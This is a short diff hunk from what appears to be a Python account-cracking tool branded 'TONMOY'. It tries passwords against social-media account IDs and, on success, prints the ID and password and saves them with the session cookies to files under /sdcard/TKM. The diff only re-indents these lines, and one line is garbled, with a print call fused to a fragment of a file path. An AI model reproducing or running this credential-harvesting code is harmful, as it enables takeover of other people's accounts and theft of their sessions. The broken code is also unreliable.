@@ -261,9 +261,9 @@ def api(id,psd,name):
 				except:iid=id
 				check = requests.get(f"xd").text
 				coki=f"xr={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(lo)["session_cookies"])
-		    	print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')d/TKM/OK-UID.txt', 'a').write(iid+' | '+psw+"\n");
-                open('/sdcard/TKM/OK-NUMBER.txt', 'a').write(id+"\n");
-                open('/sdcard/TKM/OK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
+					print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')d/TKM/OK-UID.txt', 'a').write(iid+' | '+psw+"\n");
+                    open('/sdcard/TKM/OK-NUMBER.txt', 'a').write(id+"\n");
+                    open('/sdcard/TKM/OK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
 					break
 				else:
 					print(f'\r\r{S}[TONMOY-LK] '+iid+' | '+psw+f'{W}')
